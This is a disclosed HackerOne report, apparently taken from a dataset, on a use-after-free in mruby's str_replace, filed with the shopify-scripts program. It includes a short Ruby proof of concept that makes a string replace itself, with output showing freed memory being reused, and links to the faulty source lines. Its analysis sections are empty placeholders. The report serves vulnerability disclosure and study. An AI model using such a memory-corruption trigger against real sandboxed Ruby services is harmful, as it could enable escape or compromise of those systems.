---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '193143'
original_report_id: '193143'
title: Use After Free in str_replace
weakness: Memory Corruption - Generic
team_handle: shopify-scripts
created_at: '2016-12-21T18:03:59.324Z'
disclosed_at: '2017-01-31T04:35:48.615Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- memory-corruption-generic
---

# Use After Free in str_replace

## Metadata

- HackerOne Report ID: 193143
- Weakness: Memory Corruption - Generic
- Program: shopify-scripts
- Disclosed At: 2017-01-31T04:35:48.615Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

#PoC
```ruby
$a = "A"*50
$a.replace($a)
$b = "B"*50
puts $a
```

#Output
```
$ ./bin/mruby test6.rb
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

The output should be "AAA...", but it prints "BBB...".

#Cause
`$a` is freed in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L523
and, the pointer is assigned to the same pointer in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L531

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
